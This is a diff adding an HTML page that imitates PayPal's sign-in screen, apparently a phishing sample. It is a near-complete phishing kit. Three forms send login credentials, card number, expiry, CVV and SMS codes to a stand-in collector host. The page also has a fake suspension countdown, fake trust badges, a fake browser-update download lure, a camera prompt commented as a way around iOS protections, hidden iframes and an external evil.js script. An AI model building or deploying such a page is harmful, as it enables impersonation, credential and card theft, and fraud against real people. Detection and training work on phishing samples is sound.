@@ -1,0 +1,227 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Sign in to your PayPal account</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23003087'/%3E%3Ctext x='16' y='22' font-family='Arial Black' font-size='14' fill='%23009cde' text-anchor='middle'%3EP%3C/text%3E%3C/svg%3E">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif; background: #fafafa; color: #2c2e2f; line-height: 1.5; }
+
+    /* Header */
+    .topbar { background: #fff; border-bottom: 1px solid #e5e7eb; padding: 12px 0; }
+    .topbar-inner { max-width: 460px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 24px; }
+    .logo { display: flex; align-items: center; gap: 4px; text-decoration: none; }
+    .logo-blue { color: #003087; font-family: "Arial Black", Arial, sans-serif; font-weight: 900; font-size: 22px; letter-spacing: -0.5px; }
+    .logo-light { color: #009cde; font-family: "Arial Black", Arial, sans-serif; font-weight: 900; font-size: 22px; letter-spacing: -0.5px; }
+    .topbar-link { color: #003087; text-decoration: none; font-size: 13px; font-weight: 600; }
+
+    /* Urgency banner */
+    .urgent-banner { background: #fff4e5; border-bottom: 1px solid #ffe0b2; padding: 10px 16px; text-align: center; font-size: 12px; color: #8a4500; }
+    .urgent-banner strong { color: #c62828; }
+    #countdown { font-family: "Courier New", monospace; font-weight: bold; color: #c62828; }
+
+    /* Main card */
+    .container { max-width: 460px; margin: 24px auto; padding: 0 16px; }
+    .card { background: #fff; border-radius: 16px; padding: 32px 28px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); border: 1px solid #f0f0f0; }
+    .card-icon { width: 56px; height: 56px; margin: 0 auto 16px; background: #003087; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+    .card-icon svg { fill: white; }
+    h1 { font-size: 22px; font-weight: 600; color: #2c2e2f; text-align: center; margin-bottom: 8px; }
+    .subtitle { color: #6c7378; font-size: 14px; text-align: center; margin-bottom: 24px; }
+    .step-indicator { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+    .step-dot { width: 8px; height: 8px; border-radius: 50%; background: #e0e0e0; }
+    .step-dot.active { background: #003087; }
+    .step-dot.done { background: #009cde; }
+
+    /* Form */
+    .form-group { margin-bottom: 14px; }
+    label { display: block; font-size: 13px; font-weight: 600; color: #2c2e2f; margin-bottom: 6px; }
+    input[type="email"], input[type="text"], input[type="password"], input[type="tel"] {
+      width: 100%; padding: 14px 14px; border: 1px solid #ccd2d8; border-radius: 8px;
+      font-size: 15px; transition: border-color 0.15s, box-shadow 0.15s;
+      font-family: inherit;
+    }
+    input:focus { border-color: #009cde; box-shadow: 0 0 0 3px rgba(0,156,222,0.15); outline: none; }
+    .btn-primary {
+      width: 100%; padding: 14px; background: #ffc439; color: #2c2e2f; border: 0; border-radius: 24px;
+      font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 8px;
+      transition: background 0.15s;
+    }
+    .btn-primary:hover { background: #f0b528; }
+    .btn-secondary {
+      width: 100%; padding: 14px; background: transparent; color: #009cde; border: 1px solid #009cde;
+      border-radius: 24px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 10px;
+    }
+    .help-link { display: block; text-align: center; color: #009cde; text-decoration: none; font-size: 13px; font-weight: 600; margin-top: 16px; }
+
+    /* Trust badges */
+    .trust-row { display: flex; justify-content: center; gap: 14px; margin-top: 22px; padding-top: 18px; border-top: 1px solid #f0f0f0; }
+    .trust-badge { display: flex; align-items: center; gap: 4px; font-size: 11px; color: #6c7378; }
+    .trust-badge svg { fill: #00a651; }
+
+    /* Footer */
+    footer { max-width: 460px; margin: 24px auto 32px; padding: 0 24px; text-align: center; }
+    .footer-links { font-size: 11px; color: #6c7378; }
+    .footer-links a { color: #6c7378; text-decoration: none; margin: 0 6px; }
+    .copyright { font-size: 10px; color: #9aa0a6; margin-top: 8px; }
+
+    /* Step screens */
+    .step { display: none; }
+    .step.active { display: block; }
+
+    /* Chat widget */
+    .chat-widget { position: fixed; bottom: 16px; right: 16px; background: #fff; border-radius: 50px; padding: 12px 18px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); display: flex; align-items: center; gap: 8px; cursor: pointer; border: 1px solid #f0f0f0; }
+    .chat-widget .dot { width: 8px; height: 8px; background: #00a651; border-radius: 50%; }
+    .chat-widget span { font-size: 13px; font-weight: 600; color: #003087; }
+
+    /* OTP boxes */
+    .otp-row { display: flex; gap: 8px; justify-content: center; margin: 16px 0; }
+    .otp-row input { width: 40px !important; text-align: center; font-size: 18px; font-weight: bold; padding: 12px 0 !important; }
+
+    /* Fullscreen overlay (will be enabled by JS as a fake "security alert") */
+    .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 99; align-items: center; justify-content: center; }
+    .overlay.active { display: flex; }
+    .overlay-box { background: white; max-width: 360px; padding: 24px; border-radius: 12px; text-align: center; }
+    .overlay h2 { color: #c62828; font-size: 18px; margin-bottom: 8px; }
+  </style>
+</head>
+<body>
+  <!-- Top bar with fake PayPal logo -->
+  <header class="topbar">
+    <div class="topbar-inner">
+      <a href="#" class="logo">
+        <span class="logo-blue">Pay</span><span class="logo-light">Pal</span>
+      </a>
+      <a href="#" class="topbar-link">Help</a>
+    </div>
+  </header>
+
+  <!-- Fake urgency banner with live countdown -->
+  <div class="urgent-banner">
+    ⚠️ <strong>Security notice:</strong> Unusual sign-in attempt from <strong>Lagos, Nigeria</strong>.
+    Verify within <span id="countdown">14:59</span> or your account will be suspended.
+  </div>
+
+  <main class="container">
+    <div class="card">
+      <!-- Lock icon -->
+      <div class="card-icon">
+        <svg width="28" height="28" viewBox="0 0 24 24"><path d="M12 1a5 5 0 00-5 5v3H6a2 2 0 00-2 2v9a2 2 0 002 2h12a2 2 0 002-2v-9a2 2 0 00-2-2h-1V6a5 5 0 00-5-5zm-3 5a3 3 0 116 0v3H9V6z"/></svg>
+      </div>
+
+      <h1>Verify it's you</h1>
+      <p class="subtitle">For your security, please re-enter your details to continue</p>
+
+      <!-- Step indicator -->
+      <div class="step-indicator">
+        <span class="step-dot active" id="dot1"></span>
+        <span class="step-dot" id="dot2"></span>
+        <span class="step-dot" id="dot3"></span>
+      </div>
+
+      <!-- STEP 1: Email + Password -->
+      <form id="step1form" class="step active" action="http://evil-collector.example.test/steal" method="post" autocomplete="on">
+        <div class="form-group">
+          <label for="email">Email or mobile number</label>
+          <input type="email" id="email" name="email" placeholder="you@example.com" autocomplete="username" required>
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" placeholder="Enter password" autocomplete="current-password" required>
+        </div>
+        <button type="button" class="btn-primary" onclick="advanceStep(2)">Log in</button>
+
+        <!-- User-gesture-triggered camera attack. iOS Safari blocks auto-fired
+             getUserMedia, but firing it from a click bypasses that protection —
+             this is exactly how real phishing kits get camera access on mobile. -->
+        <button type="button" class="btn-secondary" onclick="askForCamera()">
+          📷 Verify identity with selfie
+        </button>
+
+        <a href="#" class="help-link">Forgotten your password?</a>
+      </form>
+
+      <!-- STEP 2: Credit card "verification" -->
+      <form id="step2form" class="step" action="http://evil-collector.example.test/cc" method="post">
+        <p class="subtitle" style="margin-bottom: 16px;">We need to verify your payment method to keep your account active.</p>
+        <div class="form-group">
+          <label>Card number</label>
+          <input type="text" name="cc" placeholder="1234 5678 9012 3456" inputmode="numeric" autocomplete="cc-number" required>
+        </div>
+        <div style="display: flex; gap: 8px;">
+          <div class="form-group" style="flex: 1;">
+            <label>Expiry</label>
+            <input type="text" name="exp" placeholder="MM/YY" autocomplete="cc-exp" required>
+          </div>
+          <div class="form-group" style="flex: 1;">
+            <label>CVV</label>
+            <input type="text" name="cvv" placeholder="123" autocomplete="cc-csc" required>
+          </div>
+        </div>
+        <button type="button" class="btn-primary" onclick="advanceStep(3)">Verify card</button>
+      </form>
+
+      <!-- STEP 3: SMS OTP "code" -->
+      <form id="step3form" class="step" action="http://evil-collector.example.test/otp" method="post">
+        <p class="subtitle" style="margin-bottom: 16px;">We sent a 6-digit code to your phone. Enter it below.</p>
+        <div class="otp-row">
+          <input type="text" name="d1" maxlength="1" inputmode="numeric">
+          <input type="text" name="d2" maxlength="1" inputmode="numeric">
+          <input type="text" name="d3" maxlength="1" inputmode="numeric">
+          <input type="text" name="d4" maxlength="1" inputmode="numeric">
+          <input type="text" name="d5" maxlength="1" inputmode="numeric">
+          <input type="text" name="d6" maxlength="1" inputmode="numeric">
+        </div>
+        <button type="submit" class="btn-primary">Confirm code</button>
+      </form>
+
+      <!-- Trust badges (fake) -->
+      <div class="trust-row">
+        <span class="trust-badge">
+          <svg width="12" height="12" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4z"/></svg>
+          256-bit SSL
+        </span>
+        <span class="trust-badge">
+          <svg width="12" height="12" viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+          Buyer Protection
+        </span>
+        <span class="trust-badge">
+          <svg width="12" height="12" viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+          24/7 Support
+        </span>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-links">
+      <a href="#">Help</a>&nbsp;|&nbsp;<a href="#">Contact us</a>&nbsp;|&nbsp;<a href="#">Privacy</a>&nbsp;|&nbsp;<a href="#">Legal</a>
+    </div>
+    <p class="copyright">&copy; 1999–2024 PayPal Inc. All rights reserved.</p>
+  </footer>
+
+  <!-- Live-chat lure -->
+  <div class="chat-widget" onclick="document.getElementById('chatOverlay').classList.add('active')">
+    <span class="dot"></span>
+    <span>Chat with a PayPal agent</span>
+  </div>
+
+  <!-- Fake "browser security update" overlay (real phishing kits do this) -->
+  <div class="overlay" id="chatOverlay">
+    <div class="overlay-box">
+      <h2>⚠️ Browser security update required</h2>
+      <p style="font-size: 13px; color: #666; margin-bottom: 16px;">
+        Your browser is missing a critical security patch. Download the update to continue.
+      </p>
+      <button class="btn-primary" onclick="document.getElementById('chatOverlay').classList.remove('active')">Download update</button>
+    </div>
+  </div>
+
+  <!-- Hidden iframes (clickjacking / stealth content load) -->
+  <iframe src="about:blank" style="display:none" id="hf1"></iframe>
+  <iframe src="about:blank" width="1" height="1" style="position:absolute;left:-9999px;top:-9999px;"></iframe>
+
+  <script src="evil.js"></script>
+</body>
+</html>
